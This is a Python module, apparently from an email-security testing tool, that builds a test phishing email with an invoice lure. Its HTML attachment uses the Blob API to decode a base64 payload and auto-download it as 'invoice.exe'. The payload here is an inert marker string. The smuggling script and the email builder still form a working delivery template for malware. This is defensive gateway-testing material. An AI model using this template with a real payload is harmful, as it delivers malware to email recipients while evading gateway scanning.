"""T16 — HTML smuggling via attachment (Blob API)."""

import base64
from email.message import Message, EmailMessage
from .base import Technique, TechniqueMeta

_PAYLOAD = base64.b64encode(b"MAILPROBE-T16-SMUGGLED-PAYLOAD-INERT").decode()

_HTML = f"""<!DOCTYPE html>
<html>
<body>
<p>Please review the attached invoice and confirm receipt.</p>
<script>
(function(){{
  var b64="{_PAYLOAD}";
  var bin=atob(b64);
  var arr=new Uint8Array(bin.length);
  for(var i=0;i<bin.length;i++) arr[i]=bin.charCodeAt(i);
  var blob=new Blob([arr],{{type:"application/octet-stream"}});
  var a=document.createElement("a");
  a.href=URL.createObjectURL(blob);
  a.download="invoice.exe";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}})();
</script>
</body>
</html>"""


class T16(Technique):
    meta = TechniqueMeta(
        id="T16",
        name="HTML smuggling (Blob API attachment)",
        threat="HTML attachment that builds and auto-downloads an .exe via the Blob API on the client. "
               "The payload never crosses the gateway as a standalone file.",
        expected_attachments=["invoice.html"],
    )

    def build_message(self) -> Message:
        msg = EmailMessage()
        msg["Subject"] = "Invoice #INV-2024-88432 — Action Required"
        msg.set_content("Please review the attached invoice and confirm receipt.")
        msg.add_attachment(
            _HTML.encode(),
            maintype="text",
            subtype="html",
            filename="invoice.html",
        )
        return msg
